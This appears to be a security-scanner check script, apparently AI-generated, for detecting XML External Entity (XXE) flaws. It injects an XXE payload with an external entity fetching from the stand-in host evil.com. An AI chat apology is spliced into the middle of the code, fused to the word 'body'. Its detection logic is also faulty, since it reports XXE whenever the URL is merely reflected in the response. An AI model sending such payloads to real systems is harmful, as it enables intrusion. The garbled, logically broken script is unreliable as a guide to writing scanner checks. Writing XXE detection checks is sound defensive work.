metadata:
  language: v1-beta
  name: "XXE-check"
  description: "Checks for potential XXE vulnerabilities"
  author: "SecGPT"

run for each:
  potential_payload = '<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://evil.com/xxe.txt" >]><r>&sp;</r>'

given request then
  send request called check:
    method: {request.method}
    path: {request.path}
    parameters: {request.parameters.replace("PLACEHOLDER", potential_payload)}
    bodyApologies for the abrupt cut-off in the previous response. Here's the continuation of the script:

```yaml
    body: {request.body}

  if "http://evil.com/xxe.txt" in {check.response.body} then
    report issue:
      name: "Potential XXE vulnerability detected"
      severity: high
      confidence: certain
      description: "The application may be vulnerable to XML External Entity (XXE) attacks. The payload `{potential_payload}` was reflected in the HTTP response."
      remediation: "Disable the use of external entities in XML parsers to prevent XXE attacks."
      evidence: {check.response.body}
